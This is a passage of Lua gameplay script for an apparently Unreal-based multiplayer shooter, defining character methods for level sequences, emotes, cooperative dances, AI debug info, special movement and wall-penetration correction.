print(bWriteLog and Game:GetPlainName(self),"CharacterBase:PlayLevelSequenceByPathAndBindingInfo",SequenceActorPath,LevelSequencePath,TrackBindingInfo:Num(),TimeOffset)
return self:PlayLevelSequenceInternal(SequenceActorPath,LevelSequencePath,TrackBindingInfo,TimeOffset)
end
function CharacterBase:PlayLevelSequenceInternal(SequenceActorPath,LevelSequencePath,TrackBindingInfo,TimeOffset)
if TimeOffset==nil then
TimeOffset=0
end
if self.CurrentLevelSequence then
self:StopCurrentLevelSequence()
end
local SequenceTransform=FTransform()
SequenceTransform:SetLocation(self:K2_GetActorLocation())
local LevelSeqActor=Game:PlayLevelSequence(self,LevelSequencePath,SequenceTransform,SequenceActorPath,false)
if not slua.isValid(LevelSeqActor)then
print(bWriteLog and"CharacterBase:PlayLevelSequenceInternal Error")
return false
end
LevelSeqActor:SetOwner(self)
if LevelSeqActor.SetMetaData then
LevelSeqActor:SetMetaData(TrackBindingInfo,TimeOffset)
end
print(bWriteLog and"CharacterBase:PlayLevelSequenceInternal",Game:GetPlainName(self),Game:GetPlainName(LevelSeqActor),Game:GetPlainName(LevelSeqActor:GetOwner()))
self.CurrentLevelSequence=LevelSeqActor
return true
end
function CharacterBase:StopCurrentLevelSequence()
if self.CurrentLevelSequence then
print(bWriteLog and"CharacterBase:StopCurrentLevelSequence",Game:GetPlainName(self.CurrentLevelSequence))
if slua.isValid(self.CurrentLevelSequence)then
self.CurrentLevelSequence:StopMontageParticle("DirectorSequence")
self.CurrentLevelSequence:K2_DestroyActor()
end
self.CurrentLevelSequence=nil
end
end
function CharacterBase:GetCurrentLevelSequenceActor()
if not slua.isValid(self.CurrentLevelSequence)then
return nil
end
return self.CurrentLevelSequence
end
function CharacterBase:OnLevelSequenceStop(StopType)
print(bWriteLog and"CharacterBase:OnLevelSequenceStop",StopType)
if self.CurrentLevelSequence then
self.CurrentLevelSequence=nil
end
end
function CharacterBase:HandleCharacterFallingModeChange(bFalling)
if bFalling then
return
end
if not slua.isValid(self.Object)then
return
end
local uSkillManager=self:GetSkillManager()
if not slua.isValid(uSkillManager)then
return
end
if slua.isValid(self.Object)then
self:AddGameTimer(0.05,false,function()
if self.GetCurSkill then
local uCurSkill=self:GetCurSkill()
if slua.isValid(uCurSkill)and uSkillManager:IsCastingSkillID(1000001)and uSkillManager:GetSkillCurPhase(uCurSkill)==1 then
local UGameplayStatics=import("GameplayStatics")
local CurTime=UGameplayStatics.GetRealTimeSeconds(CGameWorld)
if CurTime-self.LastPlayFallSoundTime>0.7 then
print(bWriteLog and"CharacterBase:HandleCharacterFallingModeChange Do PlayFootstepSound deltatime: "..tostring(CurTime-self.LastPlayFallSoundTime).."LastPlayFallTime:"..tostring(self.LastPlayFallSoundTime))
self:PlayFootstepSound(4)
end
end
end
end)
end
end
function CharacterBase:PlayFootstepSound(eFootStepState)
self.Super:PlayFootstepSound(eFootStepState)
if not Client then
return
end
EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER,EVENTTYPE_PLAYEREVENT_CHARACTER_FOOTSTEP_SOUND,self.Object)
end
function CharacterBase:OnRep_bCableCarView()
self:SwitchFreeView(self.bCableCarView)
end
function CharacterBase:SwitchFreeView(bEnable)
if not slua.isValid(self.Object)then
return
end
print(bWriteLog and"CableCar:SwitchToFreeView:",self.Object,bEnable)
local uSpringArmComp=self.SpringArmComp
if bEnable then
self.bFreeView=true
self.bUseControllerRotationYaw=false
if slua.isValid(uSpringArmComp)then
uSpringArmComp.bForceUseTargetArmLength=true
uSpringArmComp.TargetArmLength=890
end
else
self.bFreeView=false
self.bUseControllerRotationYaw=true
if slua.isValid(uSpringArmComp)then
uSpringArmComp.bForceUseTargetArmLength=false
uSpringArmComp.TargetArmLength=220
end
end
end
function CharacterBase:IsInteractiveExpression(EmoteID)
local ItemCfg=CDataTable.GetTableData("Item",EmoteID)
if ItemCfg and ItemCfg.ItemSubType==2205 then
return true
end
return false
end
function CharacterBase:CheckCanFollowPlayEmote(EmoteId)
if not EmoteId or EmoteId==0 then
print(bWriteLog and"CharacterBase:CheckCanFollowPlayEmote Can`t Play EmoteId"..tostring(EmoteId))
return false
end
local FollowEmoteCfg=CDataTable.GetTableData("FollowEmoteCfg",EmoteId)
if FollowEmoteCfg and FollowEmoteCfg.CanPlay==0 then
print(bWriteLog and"CharacterBase:CheckCanFollowPlayEmote No CanPlay"..tostring(EmoteId).."TipsID: "..tostring(FollowEmoteCfg.TipsID))
local TipsID=44697
if FollowEmoteCfg.TipsID and FollowEmoteCfg.TipsID~=0 then
TipsID=FollowEmoteCfg.TipsID
end
local uPlayerController=self:GetPlayerControllerSafety()
if slua.isValid(uPlayerController)then
uPlayerController:DisplayGameTipWithMsgID(TipsID)
end
return false
end
if self:IsInteractiveExpression(EmoteId)then
local uPlayerController=self:GetPlayerControllerSafety()
if slua.isValid(uPlayerController)then
uPlayerController:DisplayGameTipWithMsgID(44697)
end
print(bWriteLog and"CharacterBase:CheckCanFollowPlayEmote IsInteractiveExpression"..tostring(EmoteId))
return false
end
local logic_emote=require("GameLua.Mod.Library.GamePlay.Avatar.Emote.logic_emote")
if logic_emote.IsMileStoneEmote(EmoteId)then
return false
end
if logic_emote.IsCustomWeaponShow(EmoteId)then
return false
end
return true
end
function CharacterBase:ClearFollowEmote()
if self:IsAutonomousProxy()then
if self.GetPlayerControllerSafety then
local Controller=self:GetPlayerControllerSafety()
if slua.isValid(Controller)then
Controller.OnShowFollowEmoteDelegate:BroadCast(false)
end
end
end
if self.ClearEmotePlayer then
self:ClearEmotePlayer()
end
end
function CharacterBase:ClearAkEventSound()
local UAkGameplayStatics=import("AkGameplayStatics")
local EAttachLocation=import("EAttachLocation")
local Location=FVector(0,0,0)
if slua.isValid(self.RootComponent)and EAttachLocation and Location then
local uAkComponent=UAkGameplayStatics.GetAkComponent(self.RootComponent,"",Location,EAttachLocation.KeepRelativeOffset)
if slua.isValid(uAkComponent)then
uAkComponent:Stop()
end
end
end
function CharacterBase:ShowEffectAfterSelfRescueSucceed()
end
function CharacterBase:ServerShowShowUIConfigUI(uiConfigName)
if not Client then
return
end
local ENetRole=import("ENetRole")
if UIManager.UI_Config_InGame[uiConfigName]and(self:IsLocalControlorView()or self:IsLocalViewed()or self.Role==ENetRole.ROLE_AutonomousProxy)then
UIManager.ShowUI(UIManager.UI_Config_InGame[uiConfigName])
end
end
function CharacterBase:ClientRPC_FailedToJoinDance(Reason)
ShowNotice(Reason)
end
function CharacterBase:ClientRPC_TryJoinDance(DanceActor,Index)
if not slua.isValid(DanceActor)then
print(bWriteLog and"[DanceTogether][Warning] CharacterBase ClientRPC_TryJoinDance DanceActor is not Valid")
return
end
DanceActor:ClientTryJoinDance(self.Object,Index)
end
function CharacterBase:ClientRPC_ShowEffectAfterFruitBingo(ShakingAudioPath,SurpriseAudioPath,SurpriseTipsID)
end
function CharacterBase:ClientRPC_PlayMontageCamera(LookAtLocation,Radius,Time,bLookAt,CallbackName)
local MontageCameraSubsystem=SubsystemMgr:Get("MontageCameraSubsystem")
if MontageCameraSubsystem then
if CallbackName and CallbackName~=""and self[CallbackName]and type(self[CallbackName])=="function"then
MontageCameraSubsystem:Play(LookAtLocation,Radius,Time,bLookAt,self[CallbackName])
else
MontageCameraSubsystem:Play(LookAtLocation,Radius,Time,bLookAt)
end
end
end
function CharacterBase:OnPlayMontageCameraCallback()
end
function CharacterBase:ServerRPC_FailPreJoinDance(DanceActor)
print(bWriteLog and"[DanceTogether] CharacterBase ServerRPC_FailPreJoinDance")
if not slua.isValid(DanceActor)then
print(bWriteLog and"[DanceTogether][Warning] CharacterBase ServerRPC_FailPreJoinDance DanceActor is not Valid")
return
end
DanceActor:ServerFailPreJoinDance(self.Object)
end
function CharacterBase:CheckEmoteNeedUseReliableRPC(EmoteIndex)
local Controller=self:GetPlayerControllerSafety()
if slua.isValid(Controller)and Controller.PlayEmoteFeature and Controller.PlayEmoteFeature:CheckNeedReliable(EmoteIndex)then
print(bWriteLog and"CharacterBase:CheckEmoteNeedUseReliableRPC",EmoteIndex)
return true
end
return false
end
function CharacterBase:RegisteAirControlResumEvent(OldAirControl)
self:AddControlEvent(self,"OnMovementBaseChanged",function(_,Character,NewMovementBase,OldMovementBase)
if not slua.isValid(NewMovementBase)then
print(bWriteLog and"CharacterBase:RegisteAirControlResumEvent NewMovementBase Is Not Valid")
return
end
local CharacterMovement=self.STCharacterMovement
if not slua.isValid(CharacterMovement)then
print(bWriteLog and"CharacterBase:RegisteAirControlResumEvent Is Not Valid")
return
end
CharacterMovement.AirControl=OldAirControl
local bResult=self:RemoveControlEvent(self,"OnMovementBaseChanged")
print(bWriteLog and"CharacterBase:RegisteAirControlResumEvent RemoveControlEvent ",bResult)
print(bWriteLog and"CharacterBase:RegisteAirControlResumEvent AirControl is ",CharacterMovement.AirControl)
end,self)
end
function CharacterBase:ReplaceGrenadeSkills()
local SkillReplaceConfig=GamePlayTools.GetCurrentConfig("SkillReplaceConfig")
local uSkillMgr=self:GetSkillManager()
if slua.isValid(uSkillMgr)and SkillReplaceConfig and SkillReplaceConfig.ReplaceSkill then
for sourceSkill,NewSkill in pairs(SkillReplaceConfig.ReplaceSkill)do
uSkillMgr:ReplaceSkill(sourceSkill,NewSkill)
print(bWriteLog and"CharacterBase:SkillReplaceConfig NewSkill")
end
end
end
function CharacterBase:GetGrenadeKillBindGunIDByPC(KillerPC,GrenadeID)
if Client then
print(bWriteLog and"CharacterBase:GetGrenadeKillBindGunID Not In Ds")
return 0
end
if not slua.isValid(KillerPC)then
print(bWriteLog and"CharacterBase:GetGrenadeKillBindGunID KillerPC Not Valid")
return 0
end
local ExtendAttribute=require("Server.config.ExtendAttribute")
local PlayerDataMgr=require("Server.Data.ServerPlayerDataMgr")
local GrenadeBindInfo=PlayerDataMgr.GetPlayerProgressFromServer(KillerPC.UID,ExtendAttribute.GrenadeBindWeaponMap)
if not GrenadeBindInfo then
print(bWriteLog and"CharacterBase:GetGrenadeKillBindGunID GrenadeBindInfo Nil ")
return 0
end
if GrenadeBindInfo[GrenadeID]~=nil then
return GrenadeBindInfo[GrenadeID]
end
print(bWriteLog and"CharacterBase:GetGrenadeKillBindGunID Not in GrenadeBindInfo")
return 0
end
function CharacterBase:CheckIsValidXSuitBornIslandAction(EmoteID)
local XSuitUtil=require("GameLua.Activity.Commercialize.GamePlay.XSuit.XSuitUtil")
local uPlayerController=self:GetPlayerControllerSafety()
if not slua.isValid(uPlayerController)or not uPlayerController.CommerFeature then
return false
end
local uAvatarComp2=self:getAvatarComponent2()
if not slua.isValid(uAvatarComp2)then
return false
end
local AvatarItem=uAvatarComp2:GetEquippedItemDefineID(EAvatarSlotType.EAvatarSlotType_ClothesEquipemtSlot)
if XSuitUtil:GetBornIslandActionByItemID(AvatarItem.TypeSpecificID,uAvatarComp2)~=EmoteID then
return false
end
local Period=XSuitUtil:GetPeriodByBattleActionID(EmoteID)
if Period and 0<Period then
local UnLockLevel=XSuitUtil:GetUnLockLevelByFeature(AvatarItem.TypeSpecificID,Period,uPlayerController.CommerFeature.XSuitUnlockLevelList)
local bValid=XSuitUtil:IsValidBornIslandAction(EmoteID,UnLockLevel)
print(bWriteLog and"CharacterBase:CheckIsValidXSuitBornIslandAction bValid="..tostring(bValid).." EmoteID="..tostring(EmoteID).." Period="..tostring(Period).." UnLockLevel="..tostring(UnLockLevel))
if not bValid then
return false
end
end
return true
end
function CharacterBase:CheckIsValidEmoteIDBP(EmoteID)
print(bWriteLog and"CharacterBase:CheckIsValidEmoteIDBP",EmoteID)
local IsValid=false
local Controller=self:GetPlayerControllerSafety()
if slua.isValid(Controller)and Controller.PlayEmoteFeature then
IsValid=Controller.PlayEmoteFeature:CheckIsValidEmoteIDBP(EmoteID)
end
if not IsValid and self.CoopEmoteCharFeature then
IsValid=self.CoopEmoteCharFeature:CheckIsValidEmoteIDBP(EmoteID)
end
return IsValid
end
function CharacterBase:IsCoopEmote(EmoteId,CoopPhase)
if self.CoopEmoteCharFeature then
return self.CoopEmoteCharFeature:IsCoopEmote(EmoteId,CoopPhase)
end
return false
end
function CharacterBase:ShouldShowCoopEmoteBtn(EmotePlayer)
if self.CoopEmoteCharFeature then
return self.CoopEmoteCharFeature:ShouldShowCoopEmoteBtn(EmotePlayer)
end
return false
end
function CharacterBase:RPC_Client_OnCoopEmotePhaseChange(CoopPhase)
if self.CoopEmoteCharFeature then
self.CoopEmoteCharFeature:HandleClientOnCoopEmotePhaseChange(CoopPhase)
end
end
function CharacterBase:RPC_Server_JoinCoopEmote(EmotePlayer)
local CasterPlayerKey=EmotePlayer.PlayerKey
if not CasterPlayerKey then
return
end
local CoopEmoteSubSystem=SubsystemMgr:Get("CoopEmoteSubSystem")
if not CoopEmoteSubSystem:HasCaster(CasterPlayerKey)then
print(bWriteLog and"CharacterBase:RPC_Server_JoinCoopEmote Caster not found "..tostring(CasterPlayerKey))
return
end
local CasterPlayer=Game:GetPlayerByPlayerKey(CasterPlayerKey)
if slua.isValid(CasterPlayer)then
local DistanceInMeter=(CasterPlayer:K2_GetActorLocation()-self:K2_GetActorLocation()):Size()/100
if math.floor(DistanceInMeter+0.5)>COOP_EMOTE_JOIN_CHECK_RANGE then
printf(bWriteLog and"CharacterBase:RPC_Server_JoinCoopEmote reject by distance check, SelfPlayerKey:%u, CasterPlayerKey:%u, Distance:%.0f, MaxDistance:%d",self.PlayerKey,CasterPlayerKey,DistanceInMeter*100,COOP_EMOTE_JOIN_CHECK_RANGE)
return
end
printf(bWriteLog and"CharacterBase:RPC_Server_JoinCoopEmote pass distance check, SelfPlayerKey:%u, CasterPlayerKey:%u, Distance:%.0f",self.PlayerKey,CasterPlayerKey,DistanceInMeter*100)
end
self.Super:RPC_Server_JoinCoopEmote(EmotePlayer)
end
function CharacterBase:ServerOnCoopEmotePhaseChange(CoopPhase)
if self.CoopEmoteCharFeature then
self.CoopEmoteCharFeature:HandleServerOnCoopEmotePhaseChange(CoopPhase)
end
end
function CharacterBase:CheckInPhotoGrapherMode()
local PhotoGrapherSubSystem=SubsystemMgr:Get("PhotoGrapherSubSystem")
if PhotoGrapherSubSystem and PhotoGrapherSubSystem.bIsPhotoGrapherMode then
return true
end
return false
end
function CharacterBase:ReportCharacterState()
if not slua.isValid(self.Object)then
return
end
local uPlayerController=self:GetPlayerControllerSafety()
if not slua.isValid(uPlayerController)then
return
end
print(bWriteLog and"CharacterBase:ReportCharacterState")
if uPlayerController.ReportCharacterStateData then
uPlayerController:ReportCharacterStateData()
end
end
function CharacterBase:ParseServiceDebugInfo(BasicInfoKeys,DetailInfoKeys)
if BasicInfoKeys==nil then
return
end
print(bWriteLog and string.format("CharacterBase:ParseServiceDebugInfo ignore Info, PlayerKey=%s,self.EnsureStyle=%s",tostring(self.PlayerKey),tostring(self.EnsureStyle)))
local StringUtil=require("common.string_util")
local InfoMap={}
local SpeedStr=string.format("%.3f/%.3f",self:GetVelocity():Size(),self.CharacterMovement.MaxWalkSpeed)
local PlayerStates=""
for i=0,EPawnState.__MAX do
if self:HasState(i)then
PlayerStates=PlayerStates..tostring(i)..","
end
end
if BasicInfoKeys and BasicInfoKeys:Num()<3 then
local AIDebugInfoConfig=require("GameLua.Mod.BaseMod.DS.AI.AIDebugInfoConfig")
if AIDebugInfoConfig and AIDebugInfoConfig[2]then
for _,KeysStr in pairs(AIDebugInfoConfig[2])do
BasicInfoKeys:Add(KeysStr)
end
end
end
InfoMap.Level=tostring(self.EnsureLevel)
InfoMap.Key=tostring(self:GetPlayerKey())
InfoMap.TeamID=tostring(self.TeamID)
InfoMap.HP=string.format("%d/%d",math.floor(self.Health),math.floor(self.HealthMax))
InfoMap.NearDeathBreath=string.format("%.2f",self.NearDeathBreath)
InfoMap.FreeCamera=tostring(self.SimulateViewData.FreeCamera)
InfoMap.Speed=SpeedStr
InfoMap.State=PlayerStates
InfoMap.Location=self:K2_GetActorLocation():ToString()
InfoMap.Rotation=self:K2_GetActorRotation():ToString()
InfoMap.MLAIStyle=tostring(self.MLEnsureStyle)
InfoMap.TeamInstantiated=tostring(self.TeamInstantiated)
if self.TeleportID then
InfoMap.TeleportID=tostring(self.TeleportID)
end
if self.TargetUID_Debug then
InfoMap.Target=tostring(self.TargetUID_Debug)
end
local uPlayerController=GameplayData.GetPlayerController()
if uPlayerController and slua.isValid(uPlayerController)and slua.isValid(self.Object)then
local ViewTarget=uPlayerController:GetViewTarget()
if ViewTarget and slua.isValid(ViewTarget)then
InfoMap.Distance=string.format("%.0f",Game:GetActorDistance(self.Object,ViewTarget)/100)
end
end
if self.DebugAIInfoTable then
for InfoKey,InfoValue in pairs(self.DebugAIInfoTable)do
InfoMap[InfoKey]=InfoValue
end
end
local bHaveEnsureStyle=false
local DebugInfoArray=StringUtil.Split(self.BehaviorServiceDebugInfo,";")
local ExtraInfo=""
local function SplitByFirstEqual(s)
if type(s)~="string"then
return nil,nil
end
local p=string.find(s,"=",1,true)
if not p then
return s,nil
end
return string.sub(s,1,p-1),string.sub(s,p+1)
end
for index,InfoStr in ipairs(DebugInfoArray)do
local InfoKey,InfoValue=SplitByFirstEqual(InfoStr)
if not InfoKey or not InfoValue then
ExtraInfo=ExtraInfo..InfoStr.."\n"
elseif Game:Contains(DetailInfoKeys,InfoKey)and string.find(InfoValue,"=",1,true)then
local SubKey,SubValue=SplitByFirstEqual(InfoValue)
if SubKey and SubValue then
local CombinedKey=InfoKey.."."..SubKey
DetailInfoKeys:Add(CombinedKey)
InfoMap[CombinedKey]=SubValue
else
InfoMap[InfoKey]=InfoValue
end
else
InfoMap[InfoKey]=InfoValue
if InfoKey=="EnsureStyle"then
self.EnsureStyle=tonumber(InfoValue)
bHaveEnsureStyle=true
end
if bHaveEnsureStyle==false and self.EnsureStyle and self.EnsureStyle>0 and InfoKey=="ResID"then
self.EnsureStyle=0
end
end
end
local AIType="CommonAI"
if self.EnsureStyle==4 then
AIType="CommonAI_Advance"
elseif self.EnsureStyle==1 then
AIType="MLAI"
elseif self.EnsureStyle==2 then
AIType="MLAI_Delivery"
elseif self.EnsureStyle==3 then
AIType="MLAI_Teammate"
elseif self.EnsureStyle==5 then
AIType="MLAI_Humanoid"
end
InfoMap.Type=AIType
self.ServiceDebugInfoForShow=""
local FinnalStr=""
local TempStr=""
for index,Keys in pairs(BasicInfoKeys)do
local KeysArr=StringUtil.Split(Keys,";")
local EmptyLine=true
for _,Key in ipairs(KeysArr)do
if InfoMap[Key]then
TempStr=string.format("[%s=%s]",Key,InfoMap[Key])
EmptyLine=false
FinnalStr=FinnalStr..TempStr
end
end
if not EmptyLine then
FinnalStr=FinnalStr.."\n"
end
end
FinnalStr=FinnalStr.."::"
for _,Keys in pairs(DetailInfoKeys)do
local KeysArr=StringUtil.Split(Keys,";")
local EmptyLine=true
for _,Key in ipairs(KeysArr)do
if InfoMap[Key]then
TempStr=string.format("[%s=%s]",Key,InfoMap[Key])
EmptyLine=false
FinnalStr=FinnalStr..TempStr
end
end
if not EmptyLine then
FinnalStr=FinnalStr.."\n"
end
end
FinnalStr=FinnalStr..ExtraInfo
self.ServiceDebugInfoForShow=FinnalStr
end
function CharacterBase:SetMLEnsureStyle(InMLStyle)
local DebugLastMLEnsureStyle_DS=string.format("%d_%.1f",self.MLEnsureStyle,CGameState:GetServerWorldTimeSeconds())
self:AddDebugAIInfoTable("LastMLAIStyle",DebugLastMLEnsureStyle_DS)
self.MLEnsureStyle=InMLStyle
self:DSSetCharacterIntPropertyForReplay("MLEnsureStyle",InMLStyle)
print(bWriteLog and string.format("ASTExtraBaseCharacter::SetMLEnsureStyle:%s %d",self:GetPlayerNameSafety(),InMLStyle))
end
function CharacterBase:SetMLEnsureExtraInfo(InMLEnsureExtraInfo)
self:AddDebugAIInfoTable("MLExtraInfo",InMLEnsureExtraInfo)
self.MLEnsureExtraInfo=InMLEnsureExtraInfo
self:DSSetCharacterStringPropertyForReplay("MLEnsureExtraInfo",InMLEnsureExtraInfo)
print(bWriteLog and string.format("ASTExtraBaseCharacter::SetMLEnsureExtraInfo:%s %s",self:GetPlayerNameSafety(),InMLEnsureExtraInfo))
end
function CharacterBase:GetBodyPartOffset(nBodyPart,CurrentState,nHasWeapon,nPeekState)
local StaticBodyOffsetData=require("GameLua.Mod.Library.GamePlay.AI.StaticBodyOffsetData")
local OffsetData={
0,
0,
0
}
nHasWeapon=nHasWeapon+1
nPeekState=nPeekState+1
if StaticBodyOffsetData[CurrentState]and StaticBodyOffsetData[CurrentState][nHasWeapon]and StaticBodyOffsetData[CurrentState][nHasWeapon][nPeekState]then
OffsetData=StaticBodyOffsetData[CurrentState][nHasWeapon][nPeekState][nBodyPart]or OffsetData
else
print(bWriteLog and string.format("ASTExtraBaseCharacter::GetHeadPosition StaticBodyOffsetData is nil CurrentState=%d nHasWeapon=%d nPeekState=%d",CurrentState,nHasWeapon,nPeekState))
end
return FVector(OffsetData[1],OffsetData[2],OffsetData[3])
end
function CharacterBase:BlueprintSetServiceDebugInfo(Info)
if self.DebugAIInfoTable then
for _,InfoData in pairs(self.DebugAIInfoTable)do
Info=Info..InfoData
end
end
return Info
end
function CharacterBase:AddDebugAIInfoTable(Key,StringInfo)
if not self.DebugAIInfoTable then
self.DebugAIInfoTable={}
end
if Client then
if Key and StringInfo then
self.DebugAIInfoTable[Key]=StringInfo
end
else
local ServerStringInfo=string.format("%s=%s;",Key,StringInfo)
self.DebugAIInfoTable[Key]=ServerStringInfo
end
end
function CharacterBase:InitIceDecalQueue(MaxNum)
self.IceDecalQueue={}
self.MaxIceDecalQueue=2<MaxNum and math.floor(MaxNum)or 2
self.IceDecalQueuePtr=0
for i=1,self.MaxIceDecalQueue do
table.insert(self.IceDecalQueue,false)
end
end
function CharacterBase:EnqueueIceDecal(uIceDecalActor)
if not slua.isValid(uIceDecalActor)then
return
end
if self.IceDecalQueue==nil then
self:InitIceDecalQueue(3)
end
local CurInsertIdx=self.IceDecalQueuePtr+1
if self.IceDecalQueue[CurInsertIdx]and slua.isValid(self.IceDecalQueue[CurInsertIdx])then
local uOldActor=self.IceDecalQueue[CurInsertIdx]
if slua.isValid(uOldActor)then
uOldActor:K2_DestroyActor()
end
end
self.IceDecalQueue[CurInsertIdx]=uIceDecalActor
self.IceDecalQueuePtr=(self.IceDecalQueuePtr+1)%self.MaxIceDecalQueue
end
function CharacterBase:BP_ResetDataOnRespawn()
print(bWriteLog and"CharacterBase BP_ResetDataOnRespawn")
if not Client then
local nMaxBreath=100.0
if slua.isValid(self.SwimComponet)and self.SwimComponet.MaxBreathAmount then
nMaxBreath=self.SwimComponet.MaxBreathAmount
end
self.BreathAmount=nMaxBreath
print(bWriteLog and"CharacterBase:BP_ResetDataOnRespawn refill breath, PlayerKey = "..tostring(self.PlayerKey)..", BreathAmount = "..tostring(self.BreathAmount))
end
EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL,EVENTID_INGAME_ON_RESET_DATA_ON_RESPAWN,self.Object)
end
function CharacterBase:ToString()
return string.format("%s(%s)",self.PlayerName,self.PlayerKey)
end
function CharacterBase:LuaTriggerEntrySkillWithID(SkillID,bEnable)
if not self.bClientCanTriggerSkill then
printf("LuaTriggerEntrySkillWithID PlayerKey:%u not self.bClientCanTriggerSkill",self.PlayerKey)
return
end
if self.CharacterUltraHandRepFeature and not self.CharacterUltraHandRepFeature:CanUseUltraHand()then
printf("LuaTriggerEntrySkillWithID PlayerKey:%u not CanUseUltraHand",self.PlayerKey)
return
end
self:TriggerEntrySkillWithID(SkillID,bEnable)
end
function CharacterBase:SetClientCanTriggerSkill(bCanTriggerSkill)
self.bClientCanTriggerSkill=bCanTriggerSkill
end
function CharacterBase:SetClothMeshForceLod(bEnable)
end
function CharacterBase:InitAddSpecialMoveInfo()
print(bWriteLog and"CharacterBase:InitAddSpecialMoveInfo")
if not CGame then
return
end
local GamePlayTools=require("GameLua.Mod.BaseMod.Common.GamePlayTools")
local SpecialMoveConfig=GamePlayTools.GetCurrentConfig("SpecialMoveConfig")
if not SpecialMoveConfig then
return
end
for key,value in pairs(SpecialMoveConfig.SpecialMoveObjPathInfos)do
if type(value)=="string"then
local Existing=slua.isValid(self.STCharacterMovement)and self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(key)
if Existing and slua.isValid(Existing)then
print(bWriteLog and string.format("CharacterBase:InitAddSpecialMoveInfo skip existing SpecialMoveObj_%s",tostring(key)))
else
local ObjMovementC=CGame:LoadOjectFromPath(value)
if ObjMovementC then
local ObjName=string.format("SpecialMoveObj_%d",key)
local ObjMovement=CGame:NewObjectFromClass(self,ObjMovementC,ObjName)
if ObjMovement and ObjMovement.SpecialMoveSetCharacterOwner then
ObjMovement:SpecialMoveSetCharacterOwner(self)
if slua.isValid(self.STCharacterMovement)then
self.STCharacterMovement.SpecialObjes:Add(key,ObjMovement)
end
end
end
end
end
end
for key,value in pairs(SpecialMoveConfig.CustomMoveToSpecialMoveTypes)do
if slua.isValid(self.STCharacterMovement)and type(value)=="number"then
self.STCharacterMovement.CustomMoveModeToSpecialMoveType:Add(key,value)
end
end
if SpecialMoveConfig.LuaCustomVariants then
local ESpecialMovementTypeEnum=import("ESpecialMovementType")
local LuaCustomMoveObj
if slua.isValid(self.STCharacterMovement)then
LuaCustomMoveObj=self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(ESpecialMovementTypeEnum.SPECIAL_MOVE_LuaCustom)
end
if LuaCustomMoveObj and LuaCustomMoveObj.RegisterChildVariants then
LuaCustomMoveObj:RegisterChildVariants(SpecialMoveConfig.LuaCustomVariants)
end
end
print(bWriteLog and"CharacterBase:InitAddSpecialMoveInfo over")
end
function CharacterBase:ResetSpecialMoveState()
if not CGame then
return
end
if not slua.isValid(self.STCharacterMovement)then
return
end
local GamePlayTools=require("GameLua.Mod.BaseMod.Common.GamePlayTools")
local SpecialMoveConfig=GamePlayTools.GetCurrentConfig("SpecialMoveConfig")
if not SpecialMoveConfig or not SpecialMoveConfig.SpecialMoveObjPathInfos then
return
end
for key,value in pairs(SpecialMoveConfig.SpecialMoveObjPathInfos)do
if type(value)=="string"then
local Obj=self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(key)
if Obj and slua.isValid(Obj)and Obj.ResetSpecialMoveState then
Obj:ResetSpecialMoveState()
end
end
end
print(bWriteLog and"CharacterBase:ResetSpecialMoveState over")
end
function CharacterBase:AddSpecialMoveInfo(SpecialMovementType,SpecialMovementObj)
print(bWriteLog and"CharacterBase:AddSpecialMoveInfo:"..tostring(SpecialMovementType))
SpecialMovementObj:SpecialMoveSetCharacterOwner(self)
if slua.isValid(self.STCharacterMovement)then
self.STCharacterMovement.SpecialObjes:Add(SpecialMovementType,SpecialMovementObj)
end
end
function CharacterBase:OnPlayerKeyRepExt()
print(bWriteLog and"CharacterBase:OnPlayerKeyRepExt",self.PlayerKey)
EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER,EVENTID_PLAYEREVENT_PLAYERKEY_CHANGE,self.Object)
end
function CharacterBase:OnMovementActivated()
end
function CharacterBase:HandleOnResolvePenetrationDelegate(bResolve,OldLoc,NewLoc)
if bResolve then
local Actor_C=import("/Script/Engine.Actor")
local Character_C=import("/Script/Engine.Character")
local ASTExtraVehicleBase_C=import("STExtraVehicleBase")
local ASTExtraWeapon_C=import("STExtraWeapon")
local FHitResult=import("/Script/Engine.HitResult")
local uIgnoreActorArray=slua.Array(UEnums.EPropertyClass.Object,Actor_C)
uIgnoreActorArray:Add(self.Object)
local uWeapon=self:GetCurrentWeapon()
if slua.isValid(uWeapon)then
uIgnoreActorArray:Add(uWeapon)
end
local bIsPasswall=false
local OutHits=slua.Array(UEnums.EPropertyClass.Struct,FHitResult)
local HitResult=FHitResult()
USTExtraBlueprintFunctionLibrary.TraceAllBlocks(OutHits,self.Object,OldLoc,NewLoc,HitResult,uIgnoreActorArray,false)
printf(bWriteLog and"CharacterBase:HandleOnResolvePenetrationDelegate TraceAllBlocks bHasVehicle Check PlayerKey:%u OldLoc:%s uNewLoc:%s",self.PlayerKey,OldLoc:ToString(),NewLoc:ToString())
local bHasVehicle=false
if OutHits:Num()>0 then
for Index,Hit in pairs(OutHits)do
local uHitActor=Hit.Actor
if slua.isValid(uHitActor)then
if not uHitActor:ActorHasTag("IgnorePassWall")and not uHitActor:ActorHasTag("PenetrationIgnorePassWall")and not Game:IsClassOf(uHitActor,Character_C)and not Game:IsClassOf(uHitActor,ASTExtraVehicleBase_C)and not Game:IsClassOf(uHitActor,ASTExtraWeapon_C)then
bIsPasswall=true
elseif Game:IsClassOf(uHitActor,ASTExtraVehicleBase_C)then
bHasVehicle=true
else
uIgnoreActorArray:Add(uHitActor)
end
end
end
end
if bHasVehicle then
bIsPasswall=bIsPasswall or false
end
if bIsPasswall then
local FResolvePenetrationParams=import("/Script/ShadowTrackerExtra.ResolvePenetrationParams")
local ResolveParams=FResolvePenetrationParams()
ResolveParams.AdjustRadius=50
ResolveParams.bLineTracePassWall=true
ResolveParams.AdjustMaxHeight=200
local IgnoreNumIndex=uIgnoreActorArray:Num()-1
for i=0,IgnoreNumIndex do
slua.IndexReference(ResolveParams,"PassWallIgnoreActors"):Add(uIgnoreActorArray:Get(i))
end
self:SetActorLocationSafetyWithParams(OldLoc,ResolveParams)
local uNewLoc=self:K2_GetActorLocation()
printf(bWriteLog and"CharacterBase:HandleOnResolvePenetrationDelegate PlayerKey:%u uNewLoc:%s",self.PlayerKey,uNewLoc:ToString())
end
end
end
function CharacterBase:IsCastingSkillIDFix(InSkillID)
if not self.GetSkillManager then
print(bWriteLog and"CharacterBase:IsCastingSkillIDFix self.GetSkillManager is nil, return false")
return false
end
local uSkillManager=self:GetSkillManager()
if not slua.isValid(uSkillManager)then
return false
